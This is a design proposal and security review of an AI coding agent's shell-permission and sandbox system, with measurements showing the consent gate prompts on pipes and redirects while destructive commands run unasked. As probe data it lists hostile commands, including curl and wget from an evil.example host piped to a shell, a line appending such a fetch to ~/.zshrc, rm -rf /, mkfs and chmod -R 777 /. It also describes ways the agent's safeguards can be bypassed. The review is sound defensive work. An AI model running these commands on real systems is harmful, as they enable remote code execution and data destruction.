# Permissions: from per-command approval to capability grants

**Status:** proposal.  Nothing here is implemented; this document is the review plus the
design it argues for.  Every number in "What I measured" was produced by a probe against
the code in this repo (probes kept as [`scripts/permission_prompt_probe.py`](../../../scripts/permission_prompt_probe.py)),
not estimated.

The complaint this answers: *the user is asked too often, and the design that asks is more
complicated than the thing it protects.*

## TL;DR

There are two permission mechanisms in this repo and they answer **the same question**, so
neither is decisive and the user pays for both:

* the **OS sandbox** (`agent/security/sandbox/`) decides what a shell child may touch;
* the **consent gate** (`agent/security/shell.py`) decides when to stop and ask.

Measured, at the default level: the gate asks on **19% of ordinary development commands**
and the overwhelming majority of those asks are about *syntax* (`|`, `>`, `&&`) — while
`rm -rf /`, `sudo rm -rf /`, `git clean -fdx`, `mkfs.ext4 /dev/sda1`, `chmod -R 777 /` and
`diskutil eraseDisk` all **run with no prompt at all**.  The prompt stream and the risk are
uncorrelated, because the gate classifies the *command name* while the risk lives in the
*arguments*, and the sandbox permits nearly every write.

The fix is not a better list.  It is to stop asking per command and start **granting
capabilities**:

> The sandbox is the boundary.  The human is asked only to *widen* it, or to authorise
> something that cannot be undone.  Every answer is remembered, at a lifetime the human
> chose, for the workspace they chose.

That collapses four levels into two, five consent commands into two, nine consent stores
into one, and the default prompt rate from 19% to roughly 5% — and to ~0% once a program has
been granted once.

## What I measured

Corpus: 58 commands an agent actually runs doing ordinary work (explore, read, test, build,
install, git, network, format, docker, misc).  Probe: `scripts/permission_prompt_probe.py`.

### 1. The gate fires on syntax, which is everywhere

| level | prompts | share | what still prompts |
|---|---|---|---|
| `ask` (default) | 11 / 58 | **19%** | operators ×7, inline interpreter ×2, env mutation ×2 |
| `medium` | 9 / 58 | 16% | operators ×7, env mutation ×2 |
| `high` | 2 / 58 | 3% | `pip install` ×2 |
| `full` | 2 / 58 | 3% | `pip install` ×2 |

**7 of the 11 prompts at the default level are shell operators** (as classified by the
checker's own reason string: `shell control operator` ×4, `shell redirection` ×3).  They are
the single largest source of interruption, and they are pure syntax:

```
pytest -q 2>&1 | tail -20     ->  shell control operator '|' requires confirmation
npm test > /tmp/out.txt       ->  shell redirection requires confirmation
cargo test --all 2>&1 | tee   ->  shell control operator '|' requires confirmation
ps aux | grep python          ->  shell control operator '|' requires confirmation
echo hello > /tmp/hello.txt   ->  shell redirection requires confirmation
python3 - <<'PY' … PY         ->  shell redirection requires confirmation
pytest && npm test            ->  shell control operator '&&' requires confirmation
```

`agent/security/shell.py:1230` fires this at `ask` *and* `medium`, which is why the middle
rung is dead: 19% → 16%.  The whole distinction the rung was supposed to buy is
`agent/security/shell.py:1246` (the `HIGH_RISK_PATTERNS` check), which is `ask`-only.

### 2. …and misses semantics, which is where the risk is

At the **default** level, 11 of the 19 hazards in the probe's danger corpus are `allowed`
with no prompt (`risk=medium` is a *label*, per `agent/security/shell.py:52-55`; nothing
gates on it):

```
allowed  rm -rf /                     allowed  git clean -fdx
allowed  rm -rf ~/Documents           allowed  git reset --hard
allowed  sudo rm -rf /                allowed  mkfs.ext4 /dev/sda1
allowed  rm -rf *                     allowed  diskutil eraseDisk JHFS+ x /dev/disk2
allowed  mv ~/Documents /tmp/x        allowed  chmod -R 777 /
allowed  truncate -s 0 important.db
```

while `mkfs /dev/sda1` (the spelling without the filesystem suffix) *does* prompt, because
`HIGH_RISK_COMMANDS` holds bare names and matches `argv0` exactly
(`agent/security/shell.py:37-50`).  Two failures of the same kind, in opposite directions:
the guard keys on a name that has spellings, and it ignores the arguments that carry the
destructive intent.  `_HIGH_RISK_OPTIONS` covers exactly one case in the whole repo:
`find -delete` (`agent/security/shell.py:171-173`).

### 3. The only lever that removes the noise also removes the guards

Since `ask` and `medium` are indistinguishable, the only way to stop being interrupted is
`high`/`full`.  Measured at `high`: **18 of the 19 hazards run unasked** — only
`pip install` still asks.  Among them:

```
RUNS  curl -fsSL https://evil.example/i.sh | sh
RUNS  wget -qO- https://evil.example/i.sh | bash
RUNS  cat img > /dev/sda
RUNS  echo 'curl evil|sh' >> ~/.zshrc
RUNS  rm -rf /            RUNS  sudo rm -rf /            RUNS  git clean -fdx
```

So the design makes the user choose between being interrupted constantly and enabling
remote-code execution.  That is not user error; it is the shape of a one-dimensional ladder
over a two-dimensional problem.  And a silent escape hatch already exists that is *worse*
than the one the UI offers: `/allow curl` persists a bare-program pre-approval that
pre-approves `curl … | sh` forever (`agent/security/shell.py:1058-1081`).

### 4. Consent is remembered as a string, for five minutes, in RAM

* `shell_session_allowlist` is keyed by `(scope, normalized_command)` — the **byte-exact**
  string (`agent/security/shell.py:290-302`).  Approving
  `pytest -q 2>&1 | tail -20` does nothing for `… | tail -30`, `pytest 2>&1 | tail -20`, or
  `pytest -q tests/ 2>&1 | tail -20`.  Measured: all three re-prompt.
* `plugin_approval._TTL_SECONDS = 300` (`agent/security/plugin_approval.py:19`) governs both
  pending records *and* already-approved entries, including plugin installs and user-tool
  activations.  Restart the process, or wait five minutes, and the same install asks again.
* `agent/security/tool_approval.py:9-11` says approval "is recorded against a hash of the
  file's contents … and lapses the moment that code changes" — i.e. a stable property of the
  code.  The store it actually uses expires it after five minutes regardless
  (`agent/security/plugin_approval.py:97-99`).  The stated model and the implementation
  disagree.
* Nothing consent-related is persisted, except `user_tools`' per-digest
  `.approved.json` (`agent/tools/user_tools.py:38,423-443`) and the config-level
  `shell_allowed_commands` behind `/allow`.  Two persistent mechanisms exist, and neither is
  the one the consent card offers.

### 5. Three stores, five commands, three surfaces that disagree

Three records of "the human said yes" (`shell._session_allowlist`,
`plugin_approval._PENDING`/`_APPROVED`, `user_tools`' digest file), three scope-key
computations (two of them duplicating `_scope_key`, `agent/security/plugin_approval.py:24-28`),
and five slash commands to manage them: `/permissions`, `/auto-approve`, `/allow`, `/deny`,
`/confirm`.

The card differs by surface:

| surface | answers offered | "always" reachable |
|---|---|---|
| terminal (`agent/core/output.py:38-39,915-917`) | 2 — approve / deny | **no** |
| browser (`frontend/src/components/ApprovalBar.tsx:104-121`) | 3 — once / session / deny | yes |
| Feishu/chat (`agent/commands/coordinator.py:783-889`) | type one of 14 phrases | via `allow_session` only if the web/CLI answer set it |

So `shell_session_allowlist_add_persistent` (`agent/security/shell.py:305`) — the function
that implements "stop asking me about this" — **is unreachable from the terminal**, the
surface most users are on.  Nothing on any card mentions `/allow`, which is the one thing
that would actually end the interruptions.

### 6. The ambiguity cliff, at exactly the wrong moment

When more than one record is pending, chat approval refuses and tells the user to copy a
token: "当前有 N 条命令待确认，无法用"批准"批量放行；请使用 /confirm <token> 逐条批准"
(`agent/commands/coordinator.py:879-886`).  Several pendings is what happens when the agent
is working hard — the moment the user least wants to transcribe opaque strings.  Tokens are
also the only path that survives a disconnected browser
(`agent/channels/web_sink.py:690-701`), so the fallback is load-bearing.

Separately, the phrase set that redeems a **high-risk** action includes `ok`, `okay`, `y`,
`yes` (`agent/commands/coordinator.py:27-44`).  A bare "ok" sent to acknowledge something
else redeems a pending destructive command, and the message is consumed rather than reaching
the model.

### 7. The sandbox is not the backstop it is documented to be

`agent/security/sandbox/policy.py` says the write policy is deliberately inverted — writes
open, three asset classes carved out.  Resolved, that means:

```
read=True  write=True   /etc/hosts          read=True  write=False  ~/Documents/x
read=True  write=True   /usr/bin/python3    read=True  write=False  ~/.zshrc
read=True  write=True   /System/Library/x   read=False write=False  ~/Library/Keychains/x
read=True  write=True   /tmp/anything       read=True  write=True   /
```

Three consequences for the consent question:

1. **Writes are unbounded by default.**  The sandbox cannot serve as the reason not to ask
   about `rm -rf ~/code`, because it permits it.
2. **`~/.ssh` is readable.**  `.ssh` is excluded from `_SECRET_HOME_SUBDIRS` on purpose
   (`policy.py:75-82`) so `git push` keeps working — but the *read* deny is the one that
   matters for a credential, and network egress is open (`policy.py:417`).  Reading the
   private key and posting it out is available.
3. `/etc`, `/usr`, `/System` are writable in the policy.  Only the OS's own permissions stop
   that today, which means the sandbox is not the thing holding the line there either.

## The whole consent surface, counted

So that "simpler" is a number and not an adjective, here is the entire human-consent
surface as it stands.  There are exactly **four kinds** of consent in the tree, at exactly
**four call sites** — everything else is machinery around them.

| kind | gates | asks when | ask site |
|---|---|---|---|
| `shell` | one shell command | one of six classifier branches (`shell.py:1213-1306`) | `agent/tools/builtin_tools.py:2020` |
| `memory_clear` | wipe all durable memory | always — and **only reachable where a sink can prompt** | `agent/tools/memory_tools.py:115` |
| `install_plugin` | install a plugin with executable content | plugin ships Python/MCP/hooks | `agent/tools/plugin_tools.py:556` |
| `create_tool` | run generated Python in-process | digest not already in the ledger | `agent/security/tool_approval.py:79` |

Around those four:

* **six** in-memory stores of "the human said yes", plus **three** on disk
  (`_session_allowlist`, `_pending_tokens`, `_pending_session_scope`,
  `_session_permission_levels`, `_session_sandbox_modes`, `plugin_approval._PENDING` /
  `_APPROVED`, `user_tools`' `.approved.json`, config `shell_allowed_commands`, config
  `permissions.*` defaults);
* **four** permission levels, of which two are distinguishable in practice
  (19% → 16%);
* **three** sandbox modes bound to the level by a special case
  (`effective_sandbox_mode`, `policy.py:432-445`);
* **five** slash commands (`/permissions`, `/auto-approve`, `/allow`, `/deny`, `/confirm`);
* **three** surfaces whose answer sets differ, and "always" implemented on **one** of them;
* **fourteen** chat phrases that redeem a high-risk action, including `ok` and `y`;
* **one vestigial store**: `_session_auto_approve` (`shell.py:243`) is declared, cleared,
  and never written — auto-approve is really `_session_permission_levels`.

Three asymmetries fall out of the inventory and are worth naming, because each one is a
question the user has to answer again for no reason:

* `memory_clear` mints no pending record, so it is **impossible** on a chat channel
  (`memory_tools.py:108-113` refuses without an interactive sink) while every other kind
  is answerable by reply.
* "Always allow" requires `name == "shell"` plus a real token plus a
  `ShellAuthorizationScope` (`agent/channels/web_sink.py:771-786`), so a plugin install or a
  tool activation can **never** be answered "always" — and is asked again after the 300 s
  TTL lapses.
* `create_tool` asks on every create/update unless the content digest is already in the
  ledger, while `user_tools.enabled = true` (`agent/bootstrap.py:606-612`) loads every file
  in `~/.agent/tools/` at startup with **no** digest check at all — the ledger is enforced
  on the write path and skipped on the load path.
* Destruction is not what is gated, on this side either.  `delete_tool`
  (`agent/tools/user_tools.py:763-786`) and `uninstall_plugin`
  (`agent/tools/plugin_tools.py:569-593`) never ask, while *creating* the same tool does.
  "Once granted, a plain `once` approval also leaves a five-minute allowlist entry"
  (`shell_command_confirm` writes it with the pending token's own expiry,
  `agent/security/shell.py:545-550`), so "仅此一次" is not once.

## First principles

A permission system answers two different questions, and conflating them is what produced
the design above.

**Q1 — what may this process touch?**  A *boundary* question.  The answer should be
spelling-independent, enforced without a human, and cheap to evaluate.  This is what a
sandbox is for, and `agent/security/sandbox/` already has the right shape (a policy that
answers `effective_rights(path)`, with enforcement pushed to a backend).

**Q2 — what may be done that the boundary does not settle?**  An *authority* question.  It
has exactly three answers, and they are the only three a human ever needs:

* widen the boundary (write outside the workspace, relax a secret path, unsandbox);
* do something irreversible (destroy state, run code in-process, forget memory);
* neither — in which case nobody should be asked.

The current design has no representation of Q1 in the consent path, so it asks Q2-shaped
questions using Q1-shaped evidence: it inspects the command string and asks when the string
*looks* unusable, which is a statement about syntax, not about authority.

The reframing that follows:

> **Stop approving commands.  Grant capabilities.**
> A command approval is unbounded, unmemorable work with poor precision.  A capability grant
> is rare, meaningful, and remembered.

## The design

### One boundary, one gate

* **Boundary** — the sandbox, three modes as today (`restricted` / `read_all` / `none`), but
  as an **independent axis**.  The rule "`none` requires `full`" goes away; turning the
  sandbox off is now an explicit act of the human (`/permissions sandbox none`, confirmed
  once, remembered) instead of a side effect of picking a noise level.
* **Gate** — one sentence, evaluated in one place:

  > **Ask when the command can reach outside the workspace the user gave me, or when its
  > effect cannot be undone inside it.**

Everything else runs.  Concretely, replacing the five confirm sites in
`agent/security/shell.py:1213-1306`:

| construct | today | proposed |
|---|---|---|
| `\|`, `&&`, `;`, `&`, newline | asks as a blob | **split into segments**, classify each; the operator itself is not a risk |
| `>`, `>>`, `<`, `<<` | asks | classify the **redirect target** as a write target; ask only if it is outside the workspace |
| `$(…)`, backticks | blocked | blocked (unchanged — the target set cannot be determined, so fail closed) |
| inline `-c` / `-e` body | asks | scan the body against the same rules; **block** unreadable bodies (`exec(base64…)`), run readable ones, ask when it contains an out-of-boundary path |
| `rm -rf /`, `sudo rm -rf /` | **allowed** | out-of-boundary write target → **ask** |
| `rm -rf ./build` | allowed | no ask (inside the workspace, and undoable) |
| `git clean -fdx`, `git reset --hard` | allowed | no ask (inside the workspace) — *see the open question below* |
| `mkfs.ext4 /dev/sda1`, `diskutil eraseDisk`, `dd of=/dev/…` | **allowed** | block device → ask |
| `chmod -R 777 /` | **allowed** | out-of-boundary → ask |
| `pip install -r requirements.txt` | asks at **every** level | ask, but rememberable (below); today's "every level, forever" is the one thing a level cannot express |
| write to `~/code/other-project` | silently allowed by the sandbox | ask **once**, then it is a grant |

The target extraction is the piece that needs care, and the code already has the machinery:
`_has_absolute_path_token` (`shell.py:988`) resolves path-like tokens against `allowed_roots`,
and the redirect/`of=`/`-o`/`--output` forms are a bounded set.  The safety property that
makes a heuristic acceptable: **anything whose target set cannot be determined is opaque, and
opaque fails closed** — variables, substitutions, interpreter bodies that do not parse into
the rule language.  That is the same reason `$(…)` is blocked today, applied consistently.

### One memory, three lifetimes

One store, keyed by `(scope, rule)`, where a rule is a *capability* rather than a string:

| lifetime | meaning | storage |
|---|---|---|
| `once` | this invocation, five minutes | RAM |
| `session` | this scope, this process | RAM |
| `always` | this **workspace**, this rule, with the digest of what was approved | disk |

`always` is the new part, and it is what removes the long tail.  Precedent exists in both
places it matters: `user_tools.APPROVALS_FILENAME` (`.approved.json`, a digest of what was
approved) and the config-level `shell_allowed_commands`.  A rule generalises along the axis
the human was actually granting — `program:npm` for "npm and its subcommands",
`path:/Users/august/code/other`, `install:plugin:<source>` — not along the exact bytes.

Every consent kind in the repo writes this one store: shell commands, plugin installs
(`agent/security/plugin_approval.py`), user-tool activation
(`agent/security/tool_approval.py`), memory clear (`agent/tools/memory_tools.py:104`).
That deletes two of the three scope-key implementations and the coordinator's
try-store-A-then-B logic (`agent/commands/coordinator.py:830-888`).

Revocation is one command — `/trust` lists rules and revokes one — which is what
"consent that can be granted but never taken back is not consent"
(`agent/security/shell.py:459-462`) demands, and what today requires knowing that
`/deny <program>` removes an entry from a *different* list than the one the card wrote.

### One card, every surface

The same record, rendered three ways.  The card answers four questions, and the second one
is the one no surface answers today:

```
需要你的批准                                    [不可逆]
  npm test                                     (this workspace)
  为什么问：这个程序要写 ~/code/other-project，在工作区之外
  [ 仅此一次 ]  [ 总是允许 npm（本项目） ]  [ 拒绝 ]  [ 永不允许 ]
```

* **why it is being asked**, in one sentence naming the rule that fired.  Today the card
  shows a risk level and a bare reason string; there is a `narrow_alternatives_hint`
  (`policy.py:477`) that does exactly this for sandbox denials, and the same idea belongs on
  every card.
* **three answers everywhere**: `once` / `always` (stating the scope it will cover) / `deny`,
  plus `never` as the inverse of `always`.  The terminal gains the two it lacks
  (`agent/core/output.py:915-917`); the browser keeps its bar; chat gains a **numbered list**
  so that N pendings are answered "1 3" instead of by transcribing tokens
  (`coordinator.py:879-886`).  Tokens stay as the reconnect/out-of-band path
  (`web_sink.py:690-701`), not the default.
* Approval phrases in chat shrink to the unambiguous set.  `ok`/`okay`/`y` stop redeeming a
  high-risk action; a bare `同意`/`批准`/`approve` still does, because it cannot plausibly
  mean anything else.

### Two levels, not four

`ask` (default) and `auto`, plus the sandbox as its own axis.

* `ask` = the gate above: out-of-boundary and irreversible.
* `auto` = never ask; the sandbox, the blacklist and the structural guards remain.

`medium` becomes an alias of `ask` (it differs by two prompts in 58 — the inline-interpreter
cases), `high` an alias of `auto`, and `full` an alias for `auto` + an unsandboxed
confirmation.  Old configs keep working; `/permissions` prints the two real ones and says
what the aliases map to.  Removing the middle rungs removes the incentive that currently
leads users to `high` — which is the whole reason `curl | sh` is one command away.

The gain is that **the user can be asked almost never without switching off the destructive
guard.**  Today those are the same switch.

## What this should do to the numbers

Predictions to be verified against the probe after implementation:

| | today | proposed |
|---|---|---|
| prompts on the 58-command corpus at the default | 11 (19%) | ~3 (5%) |
| prompts after one `always` per program | 11 | ~0 |
| destructive probes that run unasked at the default | 11 of 19 | 0 |
| levels a user must understand | 4 (2 real) | 2 |
| slash commands for consent | 5 | 2 |
| consent stores (in-memory + on disk) | 6 + 3 | 1 |
| surfaces where "always" exists | 1 of 3 | 3 of 3 |
| consent lifetime | 5 min, RAM | once / session / persisted per workspace |

## Open questions, in the order they change the design

1. **Write boundary.**  Keep writes open host-wide (today's inverted policy) and ask only on
   the irreversibility list — or make the **workspace the default write boundary**, allow the
   enumerated tool-state dirs (`policy.py:135-142`), and make every exception a remembered
   grant.  The second is what gives "ask" a meaning and is what I designed against; the first
   needs much less change but leaves `ask` with almost nothing to ask about once the operator
   guard is gone.
2. **`git clean -fdx` / `git reset --hard`.**  In-workspace, so the rule runs them silently —
   but they destroy *uncommitted work*, which is the one in-workspace thing that is hard to
   undo.  Either add an in-workspace irreversibility list (short: `git clean -fd*`,
   `git reset --hard`, `git checkout -- .`, `truncate` on a tracked file), or accept the loss
   as within the workspace's blast radius.
3. **Inline interpreter bodies.**  Keep asking for every `-c` / `-e` (simple, noise), or
   parse the body against the rule language and fail closed on the unreadable ones (more
   code, near-zero noise).  My recommendation is the second, but it is the largest new piece
   of machinery in this design.
4. **Command surface.**  Collapse `/allow`, `/deny`, `/auto-approve`, `/confirm` into
   `/trust` + the card, or keep them as documented aliases.  Folding is cleaner; aliases are
   free and this repo's users may script them.
5. **`~/.ssh`.**  Readable today for `git push`.  Make it read-denied by default and grant it
   per workspace (one more grant the user can choose), or leave it — it is a deliberate
   trade-off documented in `policy.py:75-82`, but it is the largest credential exposure in
   the resolved policy above.

## Implementation order (if approved)

1. **Segment the operator guard.**  `_shell_operator_guard` stops returning `confirm` for
   `|`/`&&`/`;`/`&`/newline; `shell_command_check` splits on operators and classifies each
   segment.  Removes ~64% of the prompts with no new mechanism.  Tests:
   `tests/test_shell_security.py`.
2. **Route redirects through the target check.**  `>`/`>>`/`<`/`<<` become a write-target
   question against the workspace, not a blanket confirm.
3. **Add the target extractor** (path-like argv + `of=`/`-o`/`--output` + redirect target,
   with opaque → fail closed) and the out-of-boundary → ask rule.
4. **Introduce `ConsentRule` / one `ConsentStore`**; port the three existing stores onto it;
   keep the existing public functions as thin wrappers so the surface area of the change is
   the store, not its 60-odd call sites.
5. **Make `always` persistent per workspace**, reusing the `user_tools` approvals file shape.
6. **Unify the card**: three answers on the terminal, numbered batch in chat, `why` on all
   three.
7. **Introduce `/trust`; alias the old commands.**  Reduce `/permissions` to the two real
   levels + the sandbox axis.
8. **Re-run the probe and the full suite**, and freeze the before/after table into this
   document.

Steps 1-3 are the ones that change behaviour and are worth doing first; steps 4-7 are the
simplification proper.  Step 1 alone is a small, safe, high-yield change.
